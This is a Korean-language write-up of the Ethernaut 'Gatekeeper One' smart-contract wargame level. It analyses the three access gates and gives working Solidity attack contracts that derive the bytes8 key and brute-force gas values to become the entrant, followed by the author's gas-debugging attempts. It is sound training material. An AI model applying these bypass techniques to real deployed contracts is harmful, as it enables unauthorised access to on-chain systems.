https://teberr.notion.site/Ethernaut-Gatekeeper-one-2f1aa968e2324d599f97473f9d1b2571

![Gatekeeper One.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea26f336-ed0c-4bea-90d5-bca7638cd7ae/Gatekeeper_One.png)

> 이 단계를 통과하기 위해서는 gatekeeper를 통과하고 entrant로 등록하세요

힌트:
- Telephone과 Token 단계에서 했던 것을 기억해봅시다.
- 특별한 함수인 gasleft()를 솔리디티 Docs에서 조금더 알아봅시다. [here](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [here](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

# 코드 분석 및 공격 설계

먼저 힌트를 기억해보자.

Token 문제에서는 오버플로우 및 언더플로우를 했었고 Telephone 문제에서는 tx.origin과 msg.sender의 차이점을 이해했다. 이를 고려하며 문제를 접근해보자.

문제에서는 함수가 딱 하나 존재한다. 바로 enter 함수다.

```solidity
function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
  entrant = tx.origin;
  return true;
}
```

8바이트의 gateKey를 받아서 gateOne과 gateTwo, gateThree의 모디파이어를 충족하면 entrant를 tx.origin으로 변경하고 true를 반환해준다.

즉 모디파이어들의 조건을 충족하는게 핵심이므로 모디파이어를 살펴보자

### gateOne 모디파이어

```solidity
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```

Telephone 문제에서 했던 개념과 일치한다. msg.sender는 현재 이 컨트랙트를 호출한 직전 주소이고 tx.origin은 이 컨트랙트가 호출될 때의 트랜잭션을 최초로 발생시킨 주소이다.

즉 컨트랙트를 작성하여 내 지갑 → 내 컨트랙트 → 문제 컨트랙트 를 거쳐서 enter 함수를 실행하게 되면 내지갑이 tx.origin, 내 컨트랙트가 msg.sender가 되어 gateOne 모디파이어를 충족하게 된다.

### gateTwo 모디파이어

```solidity
  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }
```

gasleft()함수는 남아있는 가스를 반환해주는 함수이다. 

남아있는 가스를 8191로 나눴을 때 나머지 값이 0이 되도록 8191의 배수로 설정해주면 된다.

### gateThree 모디파이어

```solidity
  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }
```

8바이트의 gateKey를 받아서 세개의 조건을 통과해야 한다.

1. gateKey를 uint64로 형변환한 값을 각각 uint16과 uint32로 변환하였을 때의 값이 같아야한다.
2. gateKey를 uint64로 형변환한 다음 이 값을 uint32로 형변환 했을 때 값이 달라져야 한다.
3. 내 지갑주소를 uint16으로 형변환 값이 gateKey를 uint64로 형변환한 후 uint32로 형변환했을 때와 같아야 한다.

이 세개의 조건들을 충족할 수 있도록 8바이트의 gateKey값을 찾자.

```solidity
require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");

```

먼저 gateKey와 비교하는 값중 마지막 uint16(tx.origin)의 tx.origin값은 내 지갑 주소가 되기 때문에 리믹스에서 컨트랙트를 만든 후 내 지갑주소를 넣어 대신 계산시켜 값을 알아내보자.

 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract gateOneAttack{
    address public me = 0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a;
    uint16 public target1 = uint16(me);

}
```

![uint16(tx_origin).PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1418e5cf-e28b-4ea7-9626-5ecdf4096221/uint16(tx_origin).png)

내 지갑주소를 uint16으로 넣어서 강제 형변환한 결과 41882임을 확인할 수 있다. 이 값은 hex로 A39A값으로 내 지갑주소의 마지막 2바이트임을 확인할 수 있다.

즉 gatekey를 uint64(8바이트)로 형변환 하고 이 값을 uint32(4바이트)로 형변환 한 결과값이 A39A가 나와야 한다. 

즉 gateKey는 0x????????0000A39A임을 알 수 있고 이를 확인하기 위해 코드로 확인해보면

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract gateOneAttack{
    bytes8 gateKey = 0x000000000000A39A;
    address public me = 0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a;
    uint16 public target1 = uint16(me);
    uint32 public cond3 = uint32(uint64(gateKey));

    function gatecond3 () public view returns (bool){
        if (uint32(uint64(gateKey)) == target1){
            return true;
        }
    
    }
}
```

![1차 성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/24c06c4a-e86c-41fd-b094-9bd6f266a240/1%EC%B0%A8_%EC%84%B1%EA%B3%B5.png)

uint32(uint64(gateKey))의 출력값인 cond3가 41882이고 getcond3를 통과한 것으로 gateKey는 ????????0000A39A임이 확실해졌다.

이를 바탕으로 나머지 두 조건도 유추해보자.

```solidity
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      
```

먼저 첫번째 조건인(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))를 보자

uint32(uint64(gateKey))는 gateKey가 0x????????0000A39A에서 뒷 4바이트 0000A39A를 의미하는데 이 값이 uint16(uint64(gateKey))와 같다는 것은 마지막 2바이트인 A39A만 비교했을 때 같다는 의미이므로 저절로 충족된다. (tx.origin으로 거꾸로 풀어서 그런듯)

두번째 조건인uint32(uint64(_gateKey)) != uint64(_gateKey)를 보자.

이는 gateKey의 0x????????0000A39A에서 전체 8바이트값과 uint32로 형변환한 0000A39A가 같지 않음을 의미한다. 즉 ????????에 0이 아닌 값을 넣어주기만 하면 조건이 충족된다.

즉 최종적으로 검산해보면 코드는 다음과 같다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract gateOneAttack{
    bytes8 gateKey = 0x111100000000A39A;
    address public me = 0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a;
    uint16 public target = uint16(me); // uint16(tx.origin)을 의미

    function gatecond1() public view returns(bool){
        if(uint32(uint64(gateKey)) == uint16(uint64(gateKey))){
            return true;
        }
    }
    function gatecond2() public view returns(bool){
        if(uint32(uint64(gateKey)) != uint64(gateKey)){
            return true;
        }
    }
    function gatecond3 () public view returns (bool){
        if (uint32(uint64(gateKey)) == target){
            return true;
        }
    
    }
}
```

![검산 성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6c902729-0e53-417a-8f4f-23f1589fa8a7/%EA%B2%80%EC%82%B0_%EC%84%B1%EA%B3%B5.png)

0x111100000000A39A를 바탕으로 gateThree의 조건을 전부 통과하였음을 확인할 수 있다.

# 공격

Gate를 통과하기 위해서는 gateOne,gateTwo,gateThree를 통과해야 한다.

1. gateOne 은 컨트랙트를 통해 인스턴스의 enter를 호출하여 msg.sender와 tx.origin이 다르게 하여 통과한다.
2. gateTwo는 gas를 8191의 배수로 맞춰서 나머지 결과가 0이 되도록하여 통과한다. 가스를 설정하여 전송하려면 call 함수로 enter를 호출해야한다.
3. gateThree는 gateKey로 0x111100000000A39A를 파라미터로 주어 통과한다.

공격 컨트랙트를 작성하자. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract gateOneAttack{
    address gate ;
    bytes8 gateKey = 0x111100000000A39A;

    constructor(address _addr) public {
        gate=_addr;
    }
    
    function Attack() public{        
        for (uint i = 20000; i < 20000+8191; i++) {
            (bool success, )=address(gate).call.gas(i)(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if(success){
            break;
        }
        }
    }
}
```

Attack에서 gas를 20000~28191로 반복하여 보내고 있는데 이 중에서 무조건 하나는 8191로 나눈 나머지가 0이 되기에 공격에 성공할 것이다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a25afd89-8552-4358-ae89-dad9f3a90f01/Untitled.png)

```solidity
=> Instance address
0x8184f905faC6940c96350bDB18563eDfDE5A9704
```

그리고 이를 문제 인스턴스의 주소인 0x8184f905faC6940c96350bDB18563eDfDE5A9704 를 담아서 deploy 후 공격을 진행한다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fd75ae19-2082-4f08-bd19-c8345d7baa5f/Untitled.png)

반복문을 통해서 계속해서 가스를 보내다보니 가스비가 좀 비싸긴하다..

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1954badd-de3d-4be7-a787-22f44637973b/%EC%84%B1%EA%B3%B5.png)

```solidity
await contract.entrant()
'0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a'
```

공격 진행 후 문제 인스턴스의 entrant를 보면 나의 메타마스크 지갑 주소로 변경된 것을 확인할 수 있다.

문제의 목적을 달성하였으므로 제출하면 성공의 표시가 뜬다.

# 문제 후기

가스비를 절약하기 위해서는 정확한 가스 값으로 적은 횟수로 공격을 성공시키는게 가장 바람직하다. 실제로도 반복문을 너무 많이 돌리게 되면 가스 리밋에 걸려서 제대로 안될수도 있고.. 그런데 디버그를 하면서 gasleft의 정확한 값을 찾으려고 많은 노력을 해보기도 했지만 결국 실패했다.

![gateKeeperOne 배포.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c6a01415-0689-44e9-95f5-56b2d3b3d7c8/gateKeeperOne_%EB%B0%B0%ED%8F%AC.png)

gateKeeperOne을 배포하는 장면이다. 이 인스턴스를 배포하는 이유는 Ethernaut의 문제 인스턴스로 보내면 내 리믹스에서 디버그가 불가능하므로 내 리믹스에서도 gateKeeperOne을 배포하여 디버그를 하기 위함이다.

```solidity
// 내 리믹스에서 배포한 gateKeeperOne 컨트랙트 주소
0x620A94623aBFF09cF47Acb16e48C7adc21C49D55
```

![가스값 알기 위한 공격.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cd2f37d5-2af4-497c-926b-beaad5a0ac74/%EA%B0%80%EC%8A%A4%EA%B0%92_%EC%95%8C%EA%B8%B0_%EC%9C%84%ED%95%9C_%EA%B3%B5%EA%B2%A9.png)

![디버깅.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0ca02840-28d0-454b-aeb6-834fac490eeb/%EB%94%94%EB%B2%84%EA%B9%85.png)

Attack을 해주고 나면 Debug를 할 수 있다. Debug를 해주자.

![디버그.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ab5ecb98-7432-4f96-80a3-f336e8083fd1/%EB%94%94%EB%B2%84%EA%B7%B8.png)

그리고 나면 디버그 창이 뜨는데 이 창에서 코드 중 gasleft()에 도달할 때까지 다음을 눌러서 opcode중 GAS에 맞춰서 이동하고자 했다. 하지만 잘 안움직이고 call에서 넘어가질 않길래 막대를 강제로 움직여서 gasleft로 옮겼다..

![opcode.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f2d376a8-be34-44a3-ab7c-7a207860439c/opcode.png)

![가스.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2dca25a5-6605-4a42-b737-939cf93105d1/%EA%B0%80%EC%8A%A4.png)

gas(gasleft함수의 opcode)가 실행되기 직전(아직 실행안됨) remaining gas가 302임을 확인할 수 있다. step into로 GAS opcode를 실행시키자.

![opcode2.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ad2e3d51-37aa-45b9-90ff-097155ded13a/opcode2.png)

gas가 실행되고 나면 remaining gas가 300이 된다. 

![스택.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/17349eff-4a93-4c62-abe3-f0cfba8f4f26/%EC%8A%A4%ED%83%9D.png)

GAS(gasleft()) opcode로 인해 스택에 새로 들어간 값을 보면 0x12c인데 이는 300이다. 즉 gasleft()는 300의 값임을 확인할 수 있다. 10000-300 = 9700만큼의 gas가 소모되는 것을 확인했으므로 8191 +9700 = 17889으로 가스를 조정해주자.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract gateOneAttack{
    address gate ;
    bytes8 gateKey = 0x111100000000A39A;

    constructor(address _addr) public {
        gate=_addr;
    }

    function Attack() public{        
			
         for (uint i = 0; i < 64; i++) {
						
            address(gate).call.gas(17857+i)(abi.encodeWithSignature("enter(bytes8)", gateKey));
        }

    }
}
```

컴파일 옵션에 의해서 가스값이 정확하게 17889이 아닌 오차가 생길 수 있다 따라서 17889의 근삿값으로 +-32의 값을 넣어주며 enter를 호출하도록 다시 새롭게 Deploy후 공격을 시도했으나 실패했다. 그래서 다시 디버그를 했더니 여전히 gasleft가 300에서 잘 변하지 않아 무언가 잘못되었음을 느꼈다.

그래서 네트워크의 문제라고 생각하여 Remix VM 네트워크에서 처음부터 진행해보았다.

![GAS위치 남은 gas.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7a4b5df7-1a6b-470c-80e2-725a88a98915/GAS%EC%9C%84%EC%B9%98_%EB%82%A8%EC%9D%80_gas.png)

remaining gas가 4320으로 좀 변화하는 것을 확인할 수 있었다. GAS op code를 실행하면 4318이므로 이를 바탕으로 아래와 같이 시행착오를 하였으나.. 아래와 같이 진행을 하며 결국 벽에 막히었다..

10000투입 → 5682사용 남은 것 4318

24573이 8191*3값이므로 remain_gas여야함

24478넣었을 때 -> 24226이 남음 (벌써부터 일관적으로 오르지 않아 이상함)

24794 -> 24540
24795 -> 24541
24797 -> 24543
24815 -> 24561
24827 → 24573 기대

였지만 실제로 잘 되지는 않았고.. 결국 2일 동안하였지만 네트워크가 바뀌고 컴파일러 설정으로 인해 어차피 오차가 생겨서 반복문으로 반복해야 한다는 것을 보고 brute force가 강제되는 것이라고 생각하여 포기하였다.. 테스트 이더라 괜찮은 거지 너무 돈이 많이 드는듯..
